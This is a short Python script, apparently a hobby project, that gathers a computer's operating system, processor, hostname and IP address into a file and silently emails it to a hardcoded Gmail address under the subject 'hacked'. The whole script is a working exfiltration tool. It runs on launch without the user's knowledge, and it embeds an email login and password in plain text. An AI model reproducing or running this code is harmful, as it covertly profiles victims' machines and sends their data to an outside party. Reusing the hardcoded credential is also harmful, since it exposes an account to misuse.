import socket
import platform
import smtplib
import mimetypes
from email.message import EmailMessage
class ComputerInfo():
    host_name = socket.gethostname()
    IP = socket.gethostbyname(host_name)

    def __init__(self,filenam):
        self.filenam=filenam
    def storedata(self):
        with open(self.filenam, 'a') as f:
            f.write("\nSystem: {}, {}".format(platform.system(), platform.version()))
            f.write("\nProcessor: {}".format(platform.processor()))
            f.write("\nMachine: {}".format(platform.machine()))
            f.write("\nHost Name: {}".format(self.host_name))
            f.write("\nIP Address: {}".format(self.IP))

    def sendData(self):
        message2=EmailMessage()
        sender = "pythonproject.py@gmail.com"
        recipient = "pythonproject.py@gmail.com"
        message2['From'] = sender
        message2['To'] = recipient
        message2['Subject'] = 'hacked'
        body = 'COMPUTER INFORMATION'
        message2.set_content(body)
        mime_type, _ = mimetypes.guess_type(self.filenam)
        mime_type, mime_subtype = mime_type.split('/')
        with open(self.filenam, 'rb') as file:
            message2.add_attachment(file.read(),maintype=mime_type,subtype=mime_subtype,filename=self.filenam)
        mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
        mail_server.set_debuglevel(1)
        mail_server.login("pythonproject.py@gmail.com", 'Password56789') 
        mail_server.send_message(message2)
        mail_server.quit()


ci=ComputerInfo('COMPUTERinfo.txt')
ci.storedata()
ci.sendData()

